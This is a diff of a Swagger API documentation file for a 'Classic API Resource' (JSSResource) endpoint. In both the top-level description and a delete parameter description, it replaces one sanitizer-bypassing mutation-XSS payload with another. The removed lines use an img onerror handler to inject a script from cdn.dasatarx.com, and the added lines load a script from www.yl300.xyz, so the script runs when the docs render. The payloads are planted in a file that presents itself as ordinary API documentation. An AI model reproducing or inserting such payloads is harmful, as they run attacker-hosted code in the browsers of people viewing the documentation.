@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://cdn.dasatarx.com/b/41422fd9-f393-4d25-bca3-e3f2e28d1f58'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src='https://www.yl300.xyz/js/2.js'></script>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-                <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://cdn.dasatarx.com/b/41422fd9-f393-4d25-bca3-e3f2e28d1f58'>"></form>
+                <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src='https://www.yl300.xyz/js/2.js'></script>"></form>
 
           format: int64
           in: path
